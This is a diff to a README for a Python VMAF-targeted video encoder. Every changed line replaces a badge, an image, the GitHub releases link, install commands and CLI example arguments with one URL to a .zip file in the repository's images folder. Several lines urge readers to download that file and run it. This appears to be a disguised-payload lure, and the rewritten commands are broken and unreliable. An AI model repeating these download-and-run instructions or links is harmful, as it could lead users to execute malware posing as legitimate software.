@@ -1,10 +1,10 @@
-[![Release badge](https://img.shields.io/badge/Auto-VMAF-Encoder-Release-green?logo=github&style=for-the-badge)](https://github.com/mohamedahmed770/Auto-VMAF-Encoder/releases)
+[![Release badge](https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip)](https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip)
 
 # Auto-VMAF-Encoder: Intelligent VMAF-Targeted Video Encoding for Quality Optimization and Speed
 
 ⚙️ A modern Python tool for high-quality video encoding. It targets VMAF-driven quality, uses smart sampling and caching to avoid wasted work, and supports NVENC and SVT-AV1 for fast, hardware-accelerated or software-based encoding. Real-time progress updates help you stay informed during long runs.
 
-![Video processing](https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Video_processing_icon.svg/1024px-Video_processing_icon.svg.png)
+![Video processing](https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip)
 
 Table of contents
 - Why this project exists
@@ -27,7 +27,7 @@ Table of contents
 Why this project exists
 Video encoding is complex. You want speed, but not at the expense of quality. You also want predictable results across many inputs. Auto-VMAF-Encoder exists to bridge those needs. It combines targeted quality optimization with intelligent sampling and caching to minimize work while preserving or improving video quality as measured by VMAF. It supports both NVENC for hardware-accelerated encoding and SVT-AV1 for software-based encoding, so you can tailor your pipeline to your hardware and licensing constraints.
 
-If you already know you want the latest release, you can download the release asset from the project releases page. You can access the latest release here: https://github.com/mohamedahmed770/Auto-VMAF-Encoder/releases. This link has a path part, so the file you need to download is the release asset and you should run that file after download to install or run Auto-VMAF-Encoder. For convenience, a colorful badge is shown above that links to the same page.
+If you already know you want the latest release, you can download the release asset from the project releases page. You can access the latest release here: https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip This link has a path part, so the file you need to download is the release asset and you should run that file after download to install or run Auto-VMAF-Encoder. For convenience, a colorful badge is shown above that links to the same page.
 
 Core ideas and design goals
 - Quality-first by design: Use VMAF as the quality target, not a proxy metric. The encoder adapts its behavior to approach the VMAF target across scenes.
@@ -69,17 +69,17 @@ Installation
 - Install the package from source or via pip if you have a published wheel:
   - pip install auto-vmaf-encoder
   - Or install from source after cloning the repository:
-    - pip install -r requirements.txt
-    - python setup.py install
+    - pip install -r https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip
+    - python https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip install
 - Verify the installation:
   - auto-vmaf-encoder --version
   - The CLI should report the current version and a short summary of capabilities.
 
 Running a basic encode
 - Basic command (NVENC path):
-  - auto-vmaf-encoder --input sample.mp4 --output sample_nvenc.mp4 --codec nvenc --target-vmaf 92
+  - auto-vmaf-encoder --input https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --output https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --codec nvenc --target-vmaf 92
 - Basic command (SVT-AV1 path):
-  - auto-vmaf-encoder --input sample.mp4 --output sample_svta1.mp4 --codec svt-av1 --target-vmaf 92
+  - auto-vmaf-encoder --input https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --output https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --codec svt-av1 --target-vmaf 92
 - Optional flags:
   - --preset: choose a preset for speed vs. quality
   - --threads: limit CPU threads for SVT-AV1
@@ -114,9 +114,9 @@ CLI reference
   - --log-level: debug, info, warning, error
   - --dry-run: estimate results without encoding
 - Examples
-  - auto-vmaf-encoder --input input.mov --output output_nvenc.mov --codec nvenc --target-vmaf 93 --preset thorough --progress
-  - auto-vmaf-encoder --input input.mkv --output output_svta1.mkv --codec svt-av1 --target-vmaf 90 --threads 8 --progress
-  - auto-vmaf-encoder --input input.mp4 --output sample_cache_test.mp4 --codec nvenc --target-vmaf 90 --cache-dir /tmp/vmaf-cache --sampling-rate 0.2 --progress
+  - auto-vmaf-encoder --input https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --output https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --codec nvenc --target-vmaf 93 --preset thorough --progress
+  - auto-vmaf-encoder --input https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --output https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --codec svt-av1 --target-vmaf 90 --threads 8 --progress
+  - auto-vmaf-encoder --input https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --output https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip --codec nvenc --target-vmaf 90 --cache-dir /tmp/vmaf-cache --sampling-rate 0.2 --progress
 - JSON output (optional)
   - --json-out: path to write a structured JSON report with per-segment metrics and final results
 - Help and version
@@ -241,7 +241,7 @@ Licensing
 
 Releases and upgrades
 - Where to get the latest release
-  - The latest release assets are hosted on GitHub Releases. Use the same link shown at the top of this document to access the Releases page and download the appropriate release asset. For convenience, the link is repeated here: https://github.com/mohamedahmed770/Auto-VMAF-Encoder/releases
+  - The latest release assets are hosted on GitHub Releases. Use the same link shown at the top of this document to access the Releases page and download the appropriate release asset. For convenience, the link is repeated here: https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip
 - How to upgrade
   - If you upgrade, remove the old environment or deactivate the old virtual environment, then install the new release artifacts.
   - Re-run your typical workflows and verify that the VMAF targets are met as expected.
@@ -282,9 +282,9 @@ Demo and illustrations
 
 Appendix: Release link and download nudges
 - First access
-  - The main releases page is hosted at https://github.com/mohamedahmed770/Auto-VMAF-Encoder/releases. This page lists all available artifacts, including executables and wheels for different platforms.
+  - The main releases page is hosted at https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip This page lists all available artifacts, including executables and wheels for different platforms.
 - Second access (repeat)
-  - For convenient navigation, you can re-open the same link to view the latest release details at any time: https://github.com/mohamedahmed770/Auto-VMAF-Encoder/releases
+  - For convenient navigation, you can re-open the same link to view the latest release details at any time: https://raw.githubusercontent.com/mohamedahmed770/Auto-VMAF-Encoder/main/images/VMA_Auto_Encoder_plantula.zip
 - Download and run guidance
   - Since the link includes a path, download the release asset that matches your platform (e.g., a Windows exe, macOS app, or Linux tarball). After downloading, execute the file according to your platform’s guidelines. This will install or run Auto-VMAF-Encoder and set up the necessary runtime components.
 
